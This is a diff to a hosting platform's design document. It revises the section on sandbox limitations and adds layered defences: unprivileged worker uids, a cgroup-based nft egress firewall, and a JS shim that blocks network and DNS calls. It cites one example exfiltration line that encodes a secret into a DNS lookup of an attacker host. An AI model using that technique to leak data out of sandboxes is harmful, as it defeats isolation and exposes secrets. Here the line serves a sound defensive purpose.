@@ -268,7 +268,13 @@ Users keep their accounts and deploys.
 
 These are documented in [`docs/abuse-policy.md`](./abuse-policy.md) and shown to anonymous users on the landing page:
 
-1. **JS-level sandbox only**. A determined attacker with native code can escape. For a truly hostile environment, replace `fork()` with Firecracker microVMs or Cloudflare Sandbox SDK. Not in scope for the budget launch.
+1. **No full VM isolation**. There is no per-tenant kernel/network namespace. A determined attacker with native code can still escape the Node permission sandbox, and capsules share the host network namespace (loopback). For a truly hostile environment, replace `fork()` with Firecracker microVMs or Cloudflare Sandbox SDK. Not in scope for the budget launch.
+
+   What **is** enforced today, in layers:
+   - **OS privilege separation for anonymous workers.** When the host runs as root, each anonymous-_unclaimed_ capsule worker is forked under a dedicated unprivileged uid/gid (`POND_SANDBOX_UID`/`POND_SANDBOX_GID`, defaulting to the `pond-sandbox` system account, resolved at boot). A native-addon escape then lands as a powerless user, not as the control plane. Claimed/authenticated deploys keep the host uid. **Fallback:** when the host is not root or the sandbox user can't be resolved, the host logs a warning and runs workers under the host uid (degrades to the prior behaviour — it never fails to boot). The hardened container (§3) runs as a non-root user and cannot setuid, so the drop is a no-op there; use it together with the cgroup/nft layer.
+   - **Kernel egress** (the nft firewall, §4) matches on capsule **cgroup membership**, which is uid-independent, so a dropped uid stays covered. It remains the real outbound boundary.
+   - **JS-level network shim** (defense-in-depth, not the boundary): `fetch`/`undici`, `net.Socket.connect`, **and** `dns.lookup`/`dns.resolve` are blocked in restricted workers. The DNS patch closes the obvious `dns.lookup("<secret>.attacker.com")` exfil at the JS layer (literal IPs and `localhost` still resolve so the worker can bind its own server); real DNS exfil is closed for keeps only by the nft rule dropping 53.
+
 2. **Single-instance**. The control plane is one box. Horizontal scaling needs a real DB (Postgres) and shared deploy storage — meaningful refactor.
 3. **No payments / paid tier yet**. Anonymous and authenticated are both free. Add Stripe + billing tables when you need to.
 4. **No incident response automation**. If a deploy goes viral and burns your CPU budget, you find out via the audit log or your VPS bill, not an alert.
